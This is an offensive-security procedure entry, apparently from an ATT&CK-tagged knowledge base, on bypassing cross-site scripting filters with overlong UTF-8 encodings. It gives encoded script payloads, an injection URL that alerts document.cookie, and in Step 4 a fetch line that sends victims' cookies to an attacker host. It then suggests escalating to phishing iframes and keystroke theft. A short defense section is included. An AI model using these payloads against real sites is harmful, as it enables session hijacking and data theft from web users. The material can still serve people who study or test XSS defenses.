---
id: 6210f9ff-fc1c-48a6-9374-03978b32f6a3
name: UTF-8-Bypass-for-Cross-Site-Scripting
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.057088+00:00'
updated_at: '2023-04-10T20:21:30.561332+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/JavaScript|T1059.007 - JavaScript]]'
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
sub_techniques: []
tags:
  - '[[tags/Bypass using UTF-8]]'
  - '[[tags/Cross Site Scripting]]'
  - '[[tags/Filter Bypass and exotic payloads]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# UTF-8-Bypass-for-Cross-Site-Scripting

## Summary

This procedure demonstrates how to bypass web application input validation filters for cross-site scripting (XSS) attacks by using overlong UTF-8 encodings of special characters such as <, >, ', and ". These encodings exploit weaknesses in parsers that do not properly normalize or validate multi-byte UTF-8 sequences, allowing injection of malicious JavaScript payloads into vulnerable web pages.

## Description

Cross-site scripting (XSS) attacks involve injecting malicious scripts into web pages viewed by other users. Many web applications filter common XSS payloads by blocking or escaping special characters like <script> tags. This procedure uses UTF-8 overlong encodings to represent these characters in ways that may evade simplistic filters. For example, the '<' character can be encoded as %C0%BC (an overlong two-byte form) instead of the standard %3C. This technique is effective against applications that decode UTF-8 but fail to reject invalid or overlong sequences, leading to arbitrary JavaScript execution in the victim's browser. It is typically used in reflected, stored, or DOM-based XSS scenarios to steal cookies, session tokens, or perform other actions on behalf of the victim. Prerequisites include identifying a reflection point or storage mechanism that echoes user input without proper sanitization.

## Requirements

1. Access to a web application vulnerable to XSS (e.g., a search field, comment form, or URL parameter that reflects input).
2. Knowledge of the target's input validation rules, such as blacklisting standard HTML entities but not handling UTF-8 overlongs.
3. A tool like a browser developer console or proxy (e.g., Burp Suite) to craft and test payloads.
4. Basic understanding of URL encoding and JavaScript execution in browsers.

## Defense

- Implement strict input validation and sanitization using libraries like DOMPurify or OWASP ESAPI that handle all UTF-8 variants, including overlong sequences.
- Enforce Content Security Policy (CSP) headers to restrict inline script execution and external resource loading.
- Normalize all inputs by rejecting or decoding overlong UTF-8 sequences at the server level (e.g., using strict UTF-8 decoders).
- Use HTTP-only and Secure flags on cookies to mitigate session hijacking, and implement anti-CSRF tokens.

## Objectives

1. Bypass input filters to inject unescaped special characters into reflected or stored content.
2. Execute arbitrary JavaScript in the context of a victim's browser session.
3. Steal sensitive data such as cookies, session IDs, or perform actions like keylogging or phishing.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate a web input field, parameter, or form that echoes user-supplied data back to the page without proper escaping. Test basic XSS payloads like <script>alert(1)</script> to confirm vulnerability and observe how filters react (e.g., if < is blocked but multi-byte encodings slip through).

Inspect the application's behavior using browser tools or a proxy to see where input is reflected (e.g., in HTML, attributes, or JavaScript contexts).

### Step 2: Select and Encode Special Characters

**Context**: Choose the special characters needed for your XSS payload (e.g., < for opening tags, " for attribute breaks) and replace them with UTF-8 overlong encodings to evade filters. Use the reference encodings from [[codes/UTF-8-XSS-Bypass-Encodings]] to find variants like %C0%BC for '<'.

For a basic payload, construct something like: %C0%BCscript%C0%BEalert(%C0%A7XSS%C0%A7)%C0%BC/script%C0%BE. Explain why: Overlong encodings use more bytes than necessary, which some decoders accept but filters may miss if they only check single-byte %XX forms.

### Step 3: Craft and Inject the Payload

**Context**: URL-encode the payload if submitting via GET/POST, and inject it into the vulnerable point. For example, in a search parameter: https://target.com/search?q=%C0%BCscript%C0%BEalert(document.cookie)%C0%BC/script%C0%BE.

Submit the payload and observe if the browser executes the script (e.g., an alert pops up). If in a POST form, use a tool like Burp Suite to modify the request body.

### Step 4: Verify Execution and Escalate

**Context**: Confirm successful bypass by checking for JavaScript execution, such as alerting a value or exfiltrating data to an attacker-controlled server (e.g., alert(document.cookie) or fetch('http://attacker.com?cookie='+document.cookie)).

If successful, escalate by replacing the alert with more malicious code, like creating an iframe to load phishing pages or sending keystrokes to a remote endpoint. Test across browsers, as handling of invalid UTF-8 varies (e.g., Chrome may normalize differently than Firefox).
